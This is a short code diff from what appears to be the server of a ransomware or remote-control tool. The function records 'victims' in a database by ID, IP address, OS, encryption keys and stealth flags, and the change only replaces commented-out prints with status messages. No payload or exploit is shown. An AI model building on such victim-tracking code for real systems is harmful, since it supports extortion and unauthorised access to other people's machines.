@@ -100,7 +100,7 @@ def add_victim_to_db(db, mycursor, uid, os, ip, sym_key, pub_key):
 
     #Update du client en bdd
     if len(myresult) > 0:
-        # print("client already in the database")
+        print("\t(+) client updated in database")
         query = "UPDATE victims SET ip = %s, os = %s, sym_key = %s, pub_key = %s WHERE uid = %s"
         values = (ip, os, base64.b64encode(sym_key).decode(), base64.b64encode("testupdated".encode()).decode(), uid)
 
@@ -108,7 +108,7 @@ def add_victim_to_db(db, mycursor, uid, os, ip, sym_key, pub_key):
 
     #Insert du client en bdd
     else:
-        # print("client not in the database")
+        print("\t(+) client added in database")
         query = "INSERT INTO victims (uid, ip, os, sym_key, pub_key, stealth, multi_thread) VALUES (%s, %s, %s, %s, %s, %s, %s)"
         values = (uid, ip, os, base64.b64encode(sym_key).decode(), base64.b64encode("test".encode()).decode(), True, True)
 
